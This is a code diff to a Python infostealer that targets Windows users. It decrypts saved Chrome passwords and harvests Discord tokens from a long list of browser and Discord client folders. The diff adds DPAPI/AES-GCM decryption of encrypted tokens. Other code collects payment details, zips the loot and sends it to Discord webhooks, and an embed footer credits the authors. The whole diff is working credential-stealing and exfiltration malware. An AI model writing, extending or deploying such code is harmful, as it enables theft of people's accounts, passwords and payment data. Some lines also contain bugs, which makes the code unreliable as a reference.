@@ -127,15 +127,14 @@ def get_encryption_key():
 
 def decrypt_data(data, key):
     try:
-        return AES.new(key, AES.MODE_GCM, data[3:15]).decrypt(
+        return AES.new(CryptUnprotectData(key, None, None, None, 0)[1], AES.MODE_GCM, data[3:15]).decrypt(
             data[15:])[:-16].decode()
     except BaseException:
         try:
             return str(CryptUnprotectData(data, None, None, None, 0)[1])
         except BaseException:
             return ""
-
-
+    
 def main(dirpath):
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
@@ -155,45 +154,75 @@ def main(dirpath):
                 chrome_psw_list.append([user_name, pwd_db, url])
         cursor.close()
         db.close()
+    
     for w in website:
         if w == website[0]:
             tokens = []
-
+            cleaned = []
+            
             def discord_tokens(path):
-                for file_name in os.listdir(path):
-                    if not file_name.endswith(
-                            '.log') and not file_name.endswith('.ldb'):
-                        continue
-                    for line in [x.strip() for x in open(
-                            f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                        for regex in (
-                                r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                            for token in findall(regex, line):
-                                if token not in tokens:
-                                    tokens.append(token)
-
+                try:
+                    with open(os.path.join(path, "Local State"), "r") as file:
+                        key = loads(file.read())['os_crypt']['encrypted_key']
+                        file.close()
+                except: pass
+                
+                for file in os.listdir(os.path.join(path, "Local Storage", "leveldb")):
+                    if not file.endswith(".ldb") and file.endswith(".log"): pass
+                    else:
+                        try:
+                            with open(os.path.join(path, "Local Storage", "leveldb", file), "r", errors='ignore') as files:
+                                for x in files.readlines():
+                                    x.strip()
+                                    for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
+                                        tokens.append(values)
+                        except: pass
+                for tkn in tokens:
+                    if tkn.endswith("\\"):
+                        tkn.replace("\\", "")
+                    elif tkn not in cleaned:
+                        cleaned.append(tkn)
+                for token in cleaned:
+                    try:
+                        tokens.append(decrypt_data(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:]))
+                    except:
+                        pass
+    
+            local = os.getenv('LOCALAPPDATA')
+            roaming = os.getenv('APPDATA')
             paths = [
-                os.path.join(os.getenv('LOCALAPPDATA'), "Google", "Chrome",
-                             "User Data", "Default", "Local Storage", "leveldb"),
-                os.path.join(os.getenv('APPDATA'), "Discord",
-                             "Local Storage", "leveldb"),
-                os.path.join(os.getenv('APPDATA'),
-                             "Opera Software", "Opera Stable"),
-                os.path.join(os.getenv('LOCALAPPDATA'), "BraveSoftware",
-                             "Brave-Browser", "User Data", "Default"),
-                os.path.join(os.getenv('LOCALAPPDATA'), "Yandex",
-                             "YandexBrowser", "User Data", "Default"),
-                os.path.join(os.getenv('APPDATA'), "discordptb"),
-                os.path.join(os.getenv('APPDATA'), "discordcanary"),
+                os.path.join(roaming, 'discord'),
+                os.path.join(roaming, 'discordcanary'),
+                os.path.join(roaming, 'Lightcord'),
+                os.path.join(roaming, 'discordptb'),
+                os.path.join(roaming, 'Opera Software', 'Opera Stable'),
+                os.path.join(roaming, 'Opera Software', 'Opera GX Stable'),
+                os.path.join(local, 'Amigo', 'User Data'),
+                os.path.join(local, 'Torch', 'User Data'),
+                os.path.join(local, 'Kometa', 'User Data'),
+                os.path.join(local, 'Orbitum', 'User Data'),
+                os.path.join(local, 'CentBrowser', 'User Data'),
+                os.path.join(local, '7Star', '7Star', 'User Data'),
+                os.path.join(local, 'Sputnik', 'Sputnik', 'User Data'),
+                os.path.join(local, 'Vivaldi', 'User Data', 'Default'),
+                os.path.join(local, 'Google', 'Chrome SxS', 'User Data'),
+                os.path.join(local, 'Google', 'Chrome', 'User Data' 'Default'),
+                os.path.join(local, 'Epic Privacy Browser', 'User Data'),
+                os.path.join(local, 'Microsoft', 'Edge', 'User Data', 'Default'),
+                os.path.join(local, 'uCozMedia', 'Uran', 'User Data', 'Default'),
+                os.path.join(local, 'Yandex', 'YandexBrowser', 'User Data', 'Default'),
+                os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
+                os.path.join(local, 'Iridium', 'User Data', 'Default')
             ]
+            
             threads = []
 
             def find_wb(wb):
                 if os.path.exists(wb):
                     threads.append(Thread(target=discord_tokens, args=(wb,)))
 
-            for j in paths:
-                find_wb(j)
+            for pth in paths:
+                find_wb(pth)
             for t in threads:
                 t.start()
                 t.join()
@@ -258,7 +287,7 @@ def main(dirpath):
                         all_data_p.append(writable_2)
         except BaseException:
             pass
-    return [tokens, list(set(t_lst)), list(set(tuple(element)
+    return [cleaned, list(set(t_lst)), list(set(tuple(element)
                                                for element in insta_lst)), all_data_p, chrome_psw_list, n_lst]
 
 
@@ -346,7 +375,7 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
             ) else ":x:", ":white_check_mark:" if 'payment_p' in locals() else ":x:"
             embed.add_embed_field(
                 name='PAYMENT INFO FOUNDED', value=f":credit_card:`Debit or Credit Card:` {card_e}\n:money_with_wings:`Paypal:` {paypal_e}", inline=False)
-            embed.set_footer(text='By Lemon.-_-.#3714 & cr4sh3d.py#2160')
+            embed.set_footer(text='By Lemon.-_-.#3714 & 0xSpoofed')
             embed.set_timestamp()
             with open(os.path.join(td, "data.zip"), 'rb') as f:
                 webhook.add_file(
